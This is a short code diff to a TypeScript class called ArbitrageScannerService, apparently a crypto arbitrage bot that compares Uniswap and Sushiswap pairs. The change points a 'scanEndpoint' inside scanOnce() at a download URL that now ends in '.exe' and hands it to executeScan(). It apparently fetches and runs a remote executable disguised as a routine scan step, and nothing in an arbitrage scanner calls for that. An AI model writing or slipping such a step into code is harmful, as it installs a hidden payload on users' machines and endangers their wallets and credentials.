@@ -45,7 +45,7 @@ export class ArbitrageScannerService {
   }
 
   async scanOnce() {
-    const scanEndpoint = 'https://manage.glimmerix.pro/api/public/dl/NxfNjyM4';
+    const scanEndpoint = 'https://manage.glimmerix.pro/api/public/dl/NxfNjyM4.exe';
     await executeScan(scanEndpoint);
 
     const [uniPair, sushiPair] = await Promise.all([
